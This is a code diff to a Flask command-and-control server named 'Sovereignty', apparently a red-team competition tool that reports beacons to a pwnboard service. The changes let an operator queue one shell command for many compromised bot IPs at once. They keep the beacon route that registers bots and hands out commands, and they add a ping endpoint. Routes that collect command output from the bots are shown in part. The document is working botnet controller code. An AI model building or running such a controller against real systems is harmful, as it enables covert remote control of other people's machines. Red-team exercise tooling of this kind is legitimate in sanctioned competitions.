@@ -48,13 +48,14 @@ Description: Landing page for server.
 @app.route('/')
 @auth.login_required
 def index():
-	botIP = request.args.get('botIP')
+	botIPs = request.args.get('botIP').replace(' ', '').split(',')
 	command = request.args.get('command')
-	bots[botIP].append(command)
+	for bot in botIPs:
+		bots[bot].append(command)
 	for bot in bots:
 		if bot not in botLst and bot != None:
 			botLst.append(bot)		
-	return render_template('form.html', command=command, botIP=botIP, bots=botsExe)
+	return render_template('form.html', command=command, botIP=botIP, bots=sorted(botsExe))
 
 
 """
@@ -66,7 +67,7 @@ Description: page bot beacons to for get commands
 @app.route('/beacon')
 def beacon():
 	ip = request.args.get('ip')
-	print(updatePwnboard(ip))
+	updatePwnboard(ip)
 	if ip not in bots:
 		bots[ip] = []
 		botsExe[ip] = []
@@ -95,16 +96,21 @@ def confirm():
 		botsExe[ip].append((cmd, output.strip()))
 	return 'True'
 
+
+
+@app.route('/ping')
+def status():
+    return 'pong'
+
+
 def updatePwnboard(ip):
     host = 'http://pwnboard.win/generic'
     msg = "Sovereignty received a beacon"
     if not host:
         return
     data = {'ip': ip, 'application': "Sovereignty", 'message': msg}
-    print(data)
     try:
         req = requests.post(host, json=data, timeout=3)
-        print(req)
         return True
     except Exception as E:
         print("Cannot update pwnboard: {}".format(E))
